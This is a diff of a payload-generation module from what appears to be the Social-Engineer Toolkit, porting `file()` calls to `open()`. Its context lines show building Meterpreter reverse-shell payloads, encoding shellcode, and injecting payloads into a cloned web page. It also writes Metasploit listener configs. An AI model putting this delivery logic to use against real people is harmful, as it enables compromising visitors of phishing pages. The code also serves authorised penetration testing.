@@ -34,7 +34,7 @@ if stage_encoding == "off":
 else:
     stage_encoding = "true"
 
-configfile = file("/etc/setoolkit/set.config", "r").readlines()
+configfile = open("/etc/setoolkit/set.config", "r").readlines()
 
 # check the metasploit path
 msf_path = meta_path()
@@ -56,14 +56,14 @@ linosx = 0
 multiattack = ""
 # grab attack vector
 if os.path.isfile(setdir + "/attack_vector"):
-    fileopen = file(setdir + "/attack_vector", "r")
+    fileopen = open(setdir + "/attack_vector", "r")
     for line in fileopen:
         line = line.rstrip()
         if line == "java":
             attack_vector = "java"
         if line == "multiattack":
             attack_vector = "multiattack"
-            multiattack = file(setdir + "/multi_payload", "w")
+            multiattack = open(setdir + "/multi_payload", "w")
 
 # here is a place holder for the multi attack java
 # multiattack outputs a file called multi_java if
@@ -83,7 +83,7 @@ if os.path.isfile(setdir + "/payloadgen"):
 ##########################################################################
 
 if check_options("IPADDR=") == False:
-    fileopen = file("/etc/setoolkit/set.config", "r")
+    fileopen = open("/etc/setoolkit/set.config", "r")
     data = fileopen.read()
     match = re.search("AUTO_DETECT=ON", data)
     if match:
@@ -121,7 +121,7 @@ try:
     # this is port
     choice3 = ""
     if os.path.isfile(setdir + "/meterpreter_reverse_tcp_exe"):
-        fileopen = file(setdir + "/meterpreter_reverse_tcp_exe", "r")
+        fileopen = open(setdir + "/meterpreter_reverse_tcp_exe", "r")
         for line in fileopen:
             # this reads in the first line of the file which happens to be port
             # when calling through core
@@ -185,7 +185,7 @@ try:
         encoder = 'false'
         payloadgen = 'solo'
         encode_stop = 1
-        filewrite = file(setdir + "/set.payload", "w")
+        filewrite = open(setdir + "/set.payload", "w")
         # select setshell
         if choice1 == '3':
             filewrite.write("SETSHELL")
@@ -223,7 +223,7 @@ try:
 
     # if we are using our own executable
     if custom == 1:
-        check_write = file(setdir + "/custom.exe", "w")
+        check_write = open(setdir + "/custom.exe", "w")
         check_write.write("VALID")
         check_write.close()
         shutil.copyfile("%s" % (choice1), "msf.exe")
@@ -237,11 +237,11 @@ try:
         # we need to rewrite index.html real quick because it has a parameter
         # that could get confusing
         if os.path.isfile(setdir + "/web_clone/index.html"):
-            fileopen = file(setdir + "/web_clone/index.html", "r")
+            fileopen = open(setdir + "/web_clone/index.html", "r")
             data = fileopen.read()
             data = data.replace("freehugs", "")
             os.remove(setdir + "/web_clone/index.html")
-            filewrite = file(setdir + "/web_clone/index.html", "w")
+            filewrite = open(setdir + "/web_clone/index.html", "w")
             filewrite.write(data)
             filewrite.close()
 
@@ -280,7 +280,7 @@ try:
         # if we are using the SET interactive shell then do this
         if choice1 == "set/reverse_shell":
             encoder = "false"
-            filewrite = file(setdir + "/set.payload.posix", "w")
+            filewrite = open(setdir + "/set.payload.posix", "w")
             filewrite.write("true")
             filewrite.close()
             import src.core.payloadprep
@@ -353,7 +353,7 @@ try:
                             os.remove(setdir + "/payload_options.shellcode")
                         # this is the file that gets saved with the payload and
                         # port options
-                        payload_options = file(
+                        payload_options = open(
                             setdir + "/payload_options.shellcode", "a")
 
                         while 1:
@@ -391,7 +391,7 @@ try:
 
                                 # here we prep our meta config to listen on all
                                 # the ports we want - free hugs all around
-                                filewrite = file(
+                                filewrite = open(
                                     "%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports(
                                     "%s/meta_config_multipyinjector" % (setdir), shellcode_port)
@@ -469,7 +469,7 @@ try:
                                 secret, multipyinject_payload)
                             print_status(
                                 "Dynamic cipher key created and embedded into payload.")
-                        filewrite = file(
+                        filewrite = open(
                             "%s/meterpreter.alpha_decoded" % (setdir), "w")
                         filewrite.write(shellcode)
                         filewrite.close()
@@ -478,7 +478,7 @@ try:
                         # close the pyinjector file for ports and payload
                         payload_options.close()
                     # here we are going to encode the payload via base64
-                    fileopen = file(
+                    fileopen = open(
                         "%s/meterpreter.alpha_decoded" % (setdir), "r")
                     data = fileopen.read()
                     if payloadgen != "solo":
@@ -505,7 +505,7 @@ try:
                         # last one
                         data = base64.b64encode(data)
                         #
-                    filewrite = file("%s/meterpreter.alpha" % (setdir), "w")
+                    filewrite = open("%s/meterpreter.alpha" % (setdir), "w")
                     filewrite.write(data)
                     filewrite.close()
                     if choice1 == "shellcode/alphanum":
@@ -519,18 +519,18 @@ try:
                     # here we obfuscate the binary a little bit
                     random_string = generate_random_string(3, 3).upper()
                     if choice1 == "shellcode/alphanum":
-                        fileopen = file(
+                        fileopen = open(
                             "%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb").read()
                     if choice1 == "shellcode/pyinject":
-                        fileopen = file(
+                        fileopen = open(
                             "%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb").read()
                     if choice1 == "shellcode/multipyinject":
-                        fileopen = file(
+                        fileopen = open(
                             "%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb").read()
 
                     # write out the payload
                     if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyiject":
-                        filewrite = file(setdir + "/msf.exe", "wb")
+                        filewrite = open(setdir + "/msf.exe", "wb")
                         filewrite.write(fileopen)
                         filewrite.close()
 
@@ -539,11 +539,11 @@ try:
                     # we need to read in the old index.html file because its
                     # already generated, need to present the alphanum to it
                     if os.path.isfile("%s/web_clone/index.html" % (setdir)):
-                        fileopen = file("%s/web_clone/index.html" %
+                        fileopen = open("%s/web_clone/index.html" %
                                         (setdir), "r")
-                        filewrite = file(
+                        filewrite = open(
                             "%s/web_clone/index.html.new" % (setdir), "w")
-                        fileopen2 = file("%s/meterpreter.alpha" %
+                        fileopen2 = open("%s/meterpreter.alpha" %
                                          (setdir), "r")
                         alpha_shellcode = fileopen2.read().rstrip()
                         data = fileopen.read()
@@ -580,7 +580,7 @@ try:
                     choice1 = choice9
 
         # write out the payload for powershell injection to pick it up if used
-        filewrite = file(setdir + "/metasploit.payload", "w")
+        filewrite = open(setdir + "/metasploit.payload", "w")
         filewrite.write(choice1)
         filewrite.close()
         # import if on
@@ -599,13 +599,13 @@ try:
                         except:
                             import src.payloads.powershell.prep
                         if os.path.isfile("%s/x86.powershell" % (setdir)):
-                            fileopen1 = file(
+                            fileopen1 = open(
                                 "%s/x86.powershell" % (setdir), "r")
                             x86 = fileopen1.read()
                             # open up the x86 powershell attack
-                            fileopen3 = fileopen = file(
+                            fileopen3 = fileopen = open(
                                 "%s/web_clone/index.html" % (setdir), "r")
-                            filewrite = file(
+                            filewrite = open(
                                 "%s/web_clone/index.html.new" % (setdir), "w")
                             data = fileopen3.read()
                             data = data.replace(
@@ -628,9 +628,9 @@ try:
         # here we specify the binary to deploy if we are using ones that are
         # required to drop binaries
         if custom == 1 or choice1 == "set/reverse_shell" or choice1 == "shellcode/alphanum":
-            fileopen3 = fileopen = file(
+            fileopen3 = fileopen = open(
                 "%s/web_clone/index.html" % (setdir), "r")
-            filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
+            filewrite = open("%s/web_clone/index.html.new" % (setdir), "w")
             data = fileopen3.read()
             # check if we don't want to deploy binaries
             data = data.replace('param name="8" value="NO"',
@@ -727,11 +727,11 @@ try:
             # if they want a listener, start here
             if os.path.isfile("%s/meta_config" % (setdir)):
                     # if its already created
-                filewrite = file("%s/meta_config" % (setdir), "a")
+                filewrite = open("%s/meta_config" % (setdir), "a")
 
             if not os.path.isfile("%s/meta_config" % (setdir)):
                 # if we need to create it
-                filewrite = file("%s/meta_config" % (setdir), "w")
+                filewrite = open("%s/meta_config" % (setdir), "w")
 
             # if there isn't a multiattack metasploit, setup handler
             if not os.path.isfile("%s/multi_meta" % (setdir)):
@@ -754,7 +754,7 @@ try:
 
                     # config option for using multiscript meterpreter
                     if meterpreter_multi == "ON":
-                        multiwrite = file(setdir + "/multi_meter.file", "w")
+                        multiwrite = open(setdir + "/multi_meter.file", "w")
                         multiwrite.write(meterpreter_multi_command)
                         filewrite.write(
                             "set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (setdir))
@@ -786,7 +786,7 @@ try:
                     filewrite.write("set LHOST " + choice2 + "\n")
                     filewrite.write("set LPORT " + port2 + "\n")
                     if linux_meterpreter_multi == "ON":
-                        multiwrite = file(
+                        multiwrite = open(
                             setdir + "/lin_multi_meter.file", "w")
                         multiwrite.write(linux_meterpreter_multi_command)
                         filewrite.write(
@@ -810,7 +810,7 @@ except KeyboardInterrupt:
 if attack_vector == "multiattack":
     multiattack.close()
 if os.path.isfile("%s/fileformat.file" % (setdir)):
-    filewrite = file("%s/payload.options" % (setdir), "w")
+    filewrite = open("%s/payload.options" % (setdir), "w")
     filewrite.write(choice1 + " " + ipaddr + " " + choice3)
     filewrite.close()
 
